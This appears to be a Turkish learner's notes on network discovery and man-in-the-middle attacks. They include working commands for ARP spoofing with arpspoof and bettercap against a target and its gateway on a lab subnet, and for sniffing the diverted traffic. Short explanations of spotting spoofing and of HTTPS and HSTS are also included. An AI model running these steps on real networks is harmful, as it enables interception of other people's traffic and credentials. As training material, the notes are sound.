# Ağ Analizi ve MITM Temel Kavramlar

## 1. Ağ Keşfi (Network Discovery)

- Ağ keşfi, bir yerel ağ (LAN) üzerindeki aktif cihazların, IP ve MAC adreslerinin tespit edilmesi sürecidir. Bu aşama, ağ topolojisini anlamak ve sistemleri tanımlamak için kullanılır.

### Netdiscover

- Netdiscover, yerel ağ üzerindeki cihazları ARP protokolü üzerinden tespit eden bir araçtır. Mac adresleri ve ip adreslerini gösteren tablo çıkarır

- > ifconfig // ip adresini öğrenilir (bağlı olduğun ağın ya da hedef ağın)

- > netdiscover -i eth0 -r 10.0.2.0/24 -c 10 // eth0 Taranacak ağ arayüzünü belirtir. 0/24 Hedef IP aralığını tanımlar. 10 Gönderilecek ARP istek sayısını sınırlar.

### Nmap

Nmap, ağ üzerindeki cihazları ve açık servisleri analiz etmek için kullanılan güçlü bir tarama aracıdır.

- > nmap 10.0.2.0/24

### Port

- Her veri belirli portlardan sağlanır. Her servisin kendine has portu vardır.
  Örn: 80 portu Http , 443 portu Https (Web sitesi açmak için)

### MITM (Man-in-the-Middle) Saldırı Modeli

- Hacker bilgisayar kendini ortaya konumlandırır. Kurban, tüm verileri hackera yollar (çünkü onu modem sanıyor). Hacker da bu verileri modeme yollar (çünkü trafiğin devam etmesini istiyor). Arada durup, tüm verileri okuyabilir, değiştirebilir veya kaydedebilir.

### ARP (Address Resolution Protocol) Güvenlik Açığı

- Bir bilgisayar, bir IP adresine veri göndermek isterse önce o IP’ye ait MAC adresini öğrenmek için ağa ARP isteği (Who has?) yollar.Kurbana:
  “Modemin IP’si şu, ama MAC adresi benim” der.Modeme de:
  “Kurbanın IP’si şu, ama MAC adresi benim” der.

### ARP Poison

- > apt i dsniff // ARP spoofing ve ağ trafiği manipülasyonu gibi işlemler için kullanılan `dsniff` paketinin sistem üzerine kurulmasını sağlar.

- > netdiscover -i eth0 -r 10.0.2.0/24 -c 10 // Ağ üzerindeki IP ve MAC adres eşleşmelerini keşfeder

- > echo 1 > /proc/sys/net/ipv4/ip_forward // Linux çekirdeğinde IP yönlendirme (packet forwarding) özelliğini aktif hale getirir.

- > arpspoof -i eth0 -t 10.0.2.6 10.0.2.1 // Saldırı başlar
- > arpspoof -i eth0 -t 10.0.2.1 10.0.2.6 //2 terminal hem modeme hem saldırılacak kişiye çift yönlü ARP sahteciliği oluşturur.

- > arp -a // Aynı IP için birden fazla MAC adresi görülmesi durumunda ağ anomalisi tespit edilebilir. Olası ARP spoofing saldırılarının tespit edilmesine yardımcı olur

### Wireshark

- Wireshark, ağ trafiğini gerçek zamanlı olarak izlemek ve analiz etmek için kullanılan güçlü bir ağ analiz aracıdır.Ağa gelen ve giden tüm veri paketlerini görüntüler.Paketlerin içeriğini analiz eder (örneğin: IP, TCP, HTTP, DNS, vs.).Ağ sorunlarını tespit etmeye yardımcı olur. Güvenlik açıklarını incelemek için kullanılır (örneğin: şifrelenmemiş veriler, şüpheli bağlantılar).MITM gibi saldırılarda kurbanın verilerini görmek için kullanılır.

### Spoofing

- Spoofing, Türkçede “aldatma”, “kimliğe bürünme” veya “sahtecilik” anlamına gelir ve siber güvenlikte bir sistemin, cihazın ya da kişinin kimliğini taklit ederek yapılan saldırılara verilen genel isimdir.

### Wireshark Saldırı İnceleme

- > echo 1 > /proc/sys/net/ipv4/ip_forward
- > arpspoof -i eth0 -t 10.0.2.6 10.0.2.1 //saldırı
- > arpspoof -i eth0 -t 10.0.2.1 10.0.2.6 //2 terminalle, hem modeme hem cihaz

wireshark açılıp ağ hareketleri incelenebilir heddef cihazın.

### Bettercap

- > apt install bettercap

Aktif bir saldırı aracıdır. MITM saldırıları, DNS spoofing, credential harvesting gibi saldırgan işlemleri yapabilir. CLI (komut satırı) üzerinden çalışır. Ağ üzerindeki diğer cihazları hedef alabilir. Paketleri değiştirebilir, yönlendirebilir.

- > bettercap -iface eth0 //arayüz çıkar

- > help //açıldıktan sonra yazarsan neler yapabileceğin görürünür
- > help ... // ... kısmına kullanmak istediğin method girilir.

* net.probe

- > net.probe on/off // nmap veya netdiscover ın yaptıklarını yapar. Ağları dürter. IP ve kullanıcının (telefon,bilgisayar..) isimleri görünür. net.recon da açılır.
- > help
- > net.show // topladığı bilgileri gösterir. Nmap veya Netdiscover'ın yaptıklarını yapar. Ağları dürter. IP , MAC adresi ve kullanıcının (telefon,bilgisayar..) isimleri görünür.

- > net.clear // topladığı bilgiler, siler.

* arp.spoof

- > help arp.spoof // Parametreler çıkar

- > set arp.spoof.fullduplex true //hem hedefe hem modeme saldırır
- > set arp.spoof.internal true
- > set arp.spoof.targets 10.0.2.6 //saldırılacak hedefler girilir "," koyup diğer hedefler de yazılabilir

- > arp.spoof on //üsttekileri ayarlayıp çalıştır
- > net.sniff on //saldırıyı inceletir

// saldırır ve hareketler ekranda incelenir

### Http-Https-Hsts

- HTTP (HyperText Transfer Protocol)
  -Şifreleme yoktur
  -Veriler açık metin olarak gider
  -Güvenli değildir (şifreler çalınabilir)

- HTTPS (HTTP Secure)
  -SSL/TLS ile şifrelenir
  -Veri güvenli şekilde iletilir
  -Günümüzde standarttır

- HSTS (HTTP Strict Transport Security)
  -Tarayıcıya şunu söyler:
  -“Bu siteye sadece HTTPS ile bağlan”
  -HTTP’ye düşmeyi engeller
  -HTTPS’i zorunlu hale getirir
